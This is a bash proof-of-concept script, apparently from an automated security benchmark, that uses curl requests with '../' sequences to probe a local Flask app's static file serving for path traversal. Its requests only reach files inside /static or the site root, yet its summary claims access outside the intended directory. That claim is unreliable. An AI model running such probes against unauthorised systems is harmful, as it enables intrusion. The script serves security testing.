#!/bin/bash
# POC: Demonstrates path traversal vulnerability in Flask static file serving using ../ sequences to bypass directory restrictions
# Target: ./repo
# Created: 2025-11-06T21:44:03.401Z
# Session: benchmark-XBEN-065-24-mhny77r3

# Path Traversal in Static File Serving POC
# Tests bypass of static directory restriction using ../ sequences

TARGET_URL="http://localhost:5001"
echo "[*] Testing Path Traversal in Static File Serving"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Direct static directory access (should fail with 404)
echo "[TEST 1] Direct /static/ access (expected: 404)"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/static/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "404" ]; then
    echo "✓ PASS: Direct static access properly blocked"
else
    echo "✗ FAIL: Expected 404, got $HTTP_CODE"
fi
echo ""

# Test 2: Path traversal to bypass static restriction - /static/../
echo "[TEST 2] Path traversal via /static/../ (bypass attempt)"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/static/../")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: /static/../ returns 200 (bypassed static restriction)"
    echo "Response preview (first 200 chars):"
    echo "$BODY" | head -c 200
    echo ""
    echo ""
else
    echo "✗ NOT VULNERABLE: Expected 200, got $HTTP_CODE"
fi
echo ""

# Test 3: Access static CSS via traversal
echo "[TEST 3] Access CSS file via /static/../static/css/style.css"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/static/../static/css/style.css")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
BODY_SIZE=${#BODY}
echo "HTTP Status: $HTTP_CODE"
echo "Response Size: $BODY_SIZE bytes"
if [ "$HTTP_CODE" = "200" ] && [ $BODY_SIZE -gt 0 ]; then
    echo "✓ VULNERABLE: CSS file accessible via traversal"
    echo "Response preview (first 150 chars):"
    echo "$BODY" | head -c 150
    echo ""
    echo ""
else
    echo "✗ NOT VULNERABLE: Could not access CSS via traversal"
fi
echo ""

# Test 4: Access image file via traversal
echo "[TEST 4] Access image file via /static/../static/img/logo5_white.png"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/static/../static/img/logo5_white.png")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
BODY_SIZE=${#BODY}
echo "HTTP Status: $HTTP_CODE"
echo "Response Size: $BODY_SIZE bytes"
if [ "$HTTP_CODE" = "200" ] && [ $BODY_SIZE -gt 1000 ]; then
    echo "✓ VULNERABLE: Image file accessible via traversal (PNG binary)"
else
    echo "✗ NOT VULNERABLE: Could not access image via traversal"
fi
echo ""

# Test 5: Access favicon via traversal
echo "[TEST 5] Access favicon via /static/../static/assets/fav-icon.png"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/static/../static/assets/fav-icon.png")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
BODY_SIZE=${#BODY}
echo "HTTP Status: $HTTP_CODE"
echo "Response Size: $BODY_SIZE bytes"
if [ "$HTTP_CODE" = "200" ] && [ $BODY_SIZE -gt 0 ]; then
    echo "✓ VULNERABLE: Favicon accessible via traversal"
else
    echo "✗ NOT VULNERABLE: Could not access favicon via traversal"
fi
echo ""

# Test 6: Access nested CSS via traversal
echo "[TEST 6] Access nested CSS via /static/../static/css/xss/index.css"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/static/../static/css/xss/index.css")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
BODY_SIZE=${#BODY}
echo "HTTP Status: $HTTP_CODE"
echo "Response Size: $BODY_SIZE bytes"
if [ "$HTTP_CODE" = "200" ] && [ $BODY_SIZE -gt 0 ]; then
    echo "✓ VULNERABLE: Nested CSS file accessible via traversal"
else
    echo "✗ NOT VULNERABLE: Could not access nested CSS via traversal"
fi
echo ""

# Summary
echo "=========================================="
echo "VULNERABILITY SUMMARY"
echo "=========================================="
echo "The static file serving endpoint allows path traversal via ../ sequences"
echo "to bypass directory restrictions and access files outside the intended directory."
echo "This is a path traversal vulnerability allowing information disclosure."
echo ""